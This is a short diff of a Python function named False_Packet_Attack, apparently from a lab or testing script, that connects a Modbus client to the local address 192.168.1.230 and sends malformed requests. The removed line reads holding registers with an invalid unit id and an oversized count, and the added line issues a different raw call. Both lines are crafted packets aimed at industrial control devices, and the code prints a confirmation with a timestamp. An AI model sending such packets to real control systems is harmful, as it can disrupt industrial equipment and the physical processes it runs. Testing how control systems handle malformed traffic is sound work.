@@ -13,9 +13,9 @@ def False_Packet_Attack():
     client = ModbusClient('192.168.1.230')
     client.connect()
     try:
-        client.read_holding_registers(300, 2100, unit = -1)
-    except:
-        pass
+        rr = client.call(250, 1, False)
+    except ValueError as e:
+        print(e)
     
     print("Modbus False Packet Send Attempted \n")
     print("Time Stamp: " + str(time.time()))
